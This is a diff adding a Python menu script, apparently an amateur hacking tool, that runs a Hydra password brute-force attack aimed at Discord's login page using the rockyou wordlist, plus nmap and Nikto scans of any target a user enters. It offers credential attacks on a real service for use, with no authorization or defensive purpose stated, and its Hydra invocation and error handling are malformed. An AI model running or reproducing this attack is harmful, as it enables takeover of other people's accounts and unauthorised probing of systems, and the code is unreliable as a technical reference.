@@ -1,0 +1,83 @@
+# THIS IS POWERFULL
+# ONLY WORKS ON KALI LINUX
+# ITS PYTHON ONLY
+
+import subprocess
+import socket
+import dns.resolver
+import os
+import sys
+
+def brute_force_hydra(target, username, password_file):
+    """Function to perform brute force using Hydra"""
+    print(f"Starting brute-force attack on {target} with username {username}")
+    try:
+        subprocess.run(
+            ["hydra", "-l", username, "-P", password_file, target, "http-get-form", "https://discord.com/login", "username=^USER^&password=^PASS^:F=incorrect"],
+            check=True
+        )
+    except subprocess.CalledProcessError:
+        print("Error during brute force attempt.")
+        
+def get_ip_of_website(domain):
+    """Function to get the IP address of a website"""
+    try:
+        print(f"Getting IP for {domain}...")
+        result = subprocess.run(["dig", "+short", domain], stdout=subprocess.PIPE)
+        ip_address = result.stdout.decode().strip()
+        print(f"IP address of {domain} is {ip_address}")
+    except Exception as e:
+        print(f"Error: {str(e)}")
+
+def check_vulnerabilities(target):
+    """Function to check for vulnerabilities using Nmap and Nikto"""
+    print(f"Checking vulnerabilities for {target}...")
+    try:
+        # Use nmap for basic port scanning
+        print("Running Nmap for open ports...")
+        subprocess.run(["nmap", "-sV", target])
+        
+        # Use Nikto for web vulnerability scanning
+        print("Running Nikto for web vulnerabilities...")
+        subprocess.run(["nikto", "-h", target])
+        
+    except subprocess.CalledProcessError:
+        print("Error while checking vulnerabilities.")
+        
+def display_menu():
+    """Function to display the menu options"""
+    print("Choose an option:")
+    print("1. Brute-force attack using Hydra")
+    print("2. Get IP of a website")
+    print("3. Check website vulnerabilities")
+    print("4. Exit")
+    
+def main():
+    """Main function to execute the script"""
+    while True:
+        display_menu()
+        choice = input("Enter your choice: ")
+        
+        if choice == "1":
+            target = input("Enter the target URL: ")
+            username = input("Enter the username for brute-force: ")
+            password_file = input("Enter the path to the password list (e.g., /usr/share/wordlists/rockyou.txt): ")
+            brute_force_hydra(target, username, password_file)
+        
+        elif choice == "2":
+            domain = input("Enter the website domain: ")
+            get_ip_of_website(domain)
+        
+        elif choice == "3":
+            target = input("Enter the website URL for vulnerability check: ")
+            check_vulnerabilities(target)
+        
+        elif choice == "4":
+            print("Exiting program.")
+            sys.exit()
+        
+        else:
+            print("Invalid choice, please select a valid option.")
+            
+if __name__ == "__main__":
+    main()
